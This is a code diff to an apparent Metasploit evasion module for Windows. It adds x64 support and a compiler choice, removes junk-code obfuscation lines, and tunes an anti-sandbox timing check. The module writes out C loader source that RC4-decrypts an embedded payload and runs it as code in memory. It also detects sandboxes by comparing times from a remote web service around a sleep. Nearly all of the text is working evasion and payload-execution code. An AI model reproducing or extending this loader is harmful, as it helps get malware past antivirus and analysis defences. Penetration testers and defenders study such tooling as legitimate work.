@@ -24,7 +24,7 @@ class MetasploitModule < Msf::Evasion
         'Author' => [ 'Arthur RAOUT@nbs-system' ],
         'License' => MSF_LICENSE,
         'Platform' => 'win',
-        'Arch' => ARCH_X86,
+        'Arch' => [ARCH_X86, ARCH_X64],
         'Targets' => [ ['Microsoft Windows', {}] ]
       )
     )
@@ -179,14 +179,11 @@ class MetasploitModule < Msf::Evasion
     while (token != NULL) {
         if (strstr(token, fieldName)) {
             if (sscanf(token, "%*[^:]: %d", fieldValue) == 1) {
-  #{junk_code(1)}
                 return 1;
             } else {
-  #{junk_code(1)}
                 return 0;
             }
         }
-  #{junk_code(1)}
 
         token = strtok(NULL, delimiter);
     }
@@ -201,7 +198,6 @@ class MetasploitModule < Msf::Evasion
     const char *path = "/api/timezone/Europe/London.txt";
 
      WSADATA wsaData;
-  #{junk_code(1)}
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         return EXIT_FAILURE;
     }
@@ -220,7 +216,6 @@ class MetasploitModule < Msf::Evasion
 
     struct sockaddr_in server_address;
     server_address.sin_family = AF_INET;
-  #{junk_code(1)}
     server_address.sin_port = htons(port);
     memcpy(&server_address.sin_addr, host_info->h_addr_list[0], host_info->h_length);
 
@@ -243,14 +238,12 @@ class MetasploitModule < Msf::Evasion
     char response[4096];
     ssize_t received_bytes;
 
-  #{junk_code(1)}
     while ((received_bytes = recv(client_socket, response, sizeof(response) - 1, 0)) > 0) {
         response[received_bytes] = '\0';
     }
 
     int unixtime;
     extractField(response, "unixtime", &unixtime);
-  #{junk_code(1)}
     close(client_socket);
     WSACleanup();
     return unixtime;
@@ -259,14 +252,13 @@ class MetasploitModule < Msf::Evasion
   int time_distortion() {
     int unixtime = get_time();
     sleep(10);
-  #{junk_code(1)}
     int unixtime2 = get_time();
+    sleep(2);
     int diff = unixtime2 - unixtime;
-    if( diff < 11 )
+    if( diff < 9 )
        exit(1);
     else
       return (1);
-  #{junk_code(1)}
     return 0;
   }
   |
@@ -293,24 +285,15 @@ int main(int argc, char **argv)
   int size  = #{get_payload[:size]};
   char buf[#{get_payload[:size]}];
   int lpBufSize = sizeof(int) * size;
-  #{junk_code(1)}
   LPVOID lpBuf = _malloca(lpBufSize);
-  #{junk_code(1)}
   memset(lpBuf, '\\0', lpBufSize);
   #{get_payload_bytes}
 
-  #{junk_code(1)}
   RC4("#{rc4_key}", buf, (char*) lpBuf, size);
-  #{junk_code(1)}
     void (*func)();
-  #{junk_code(1)}
     func = (void (*)()) lpBuf;
-  #{junk_code(1)}
-  printf("Running payload\\n");
     (void)(*func)();
-  #{junk_code(1)}
     return 0;
-  #{junk_code(1)}
 }|
   end
 
@@ -318,7 +301,12 @@ int main(int argc, char **argv)
     fname = Rex::Text.rand_text_alpha(4..7)
     path = File.join(Msf::Config.local_directory, fname)
     full_path = ::File.expand_path(path)
-    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: ' -lpsapi -lwininet -lwinmm -lws2_32 -w ' })
+    
+    if payload.inspect.split('@pinst').last.split(' ').first.include?("x64")
+      m = Metasploit::Framework::Compiler::Mingw::X64.new({ show_compile_cmd: true, f_name: full_path, compile_options: ' -lpsapi -lwininet -lwinmm -lws2_32 -w ' })
+    else
+      m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: ' -lpsapi -lwininet -lwinmm -lws2_32 -w ' })
+    end
     output = m.compile_c(c_template)
     if !output.empty?
       print_error(output)
